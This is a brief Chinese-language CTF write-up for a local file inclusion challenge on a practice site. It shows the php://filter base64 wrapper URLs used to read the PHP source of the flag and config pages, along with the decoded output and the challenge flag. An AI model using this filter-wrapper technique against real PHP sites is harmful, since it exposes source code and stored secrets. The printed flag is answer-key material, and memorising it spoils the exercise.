LFI
===

直接給了一句關鍵提示「There is no second place like 127.0.0.1」
必且嘗試使用功能表上的功能，觀察網址列變化。

```
https://hackme.inndy.tw/lfi/?page=pages/index
https://hackme.inndy.tw/lfi/?page=pages/intro
```

1. 透過檢視原始碼觀察頁面發現有 flag 的連結 `pages/flag`。
```
Can you read the flag?
```
2. 猜想可能讀取的是 PHP，嘗試使用 PHP 偽協議進行讀檔。
```
https://hackme.inndy.tw/lfi/?page=php://filter/convert.base64-encode/resource=pages/flag
```
3. Base64 Decode
```
Q2FuIHlvdSByZWFkIHRoZSBmbGFnPD9waHAgcmVxdWlyZSgnY29uZmlnLnBocCcpOyA/Pj8K
Can you read the flag<?php require('config.php'); ?>?
```
4. 讀取 config.php
```
https://hackme.inndy.tw/lfi/?page=php://filter/convert.base64-encode/resource=pages/config
```
5. Base64 Decode
```
PD9waHAKCiRmbGFnID0gIkZMQUd7WW9vb29vb19MRklfZzAwZF8yY1h4c1hTWVA5RVZMcklvfSI7Cg==
$flag = "FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}";
```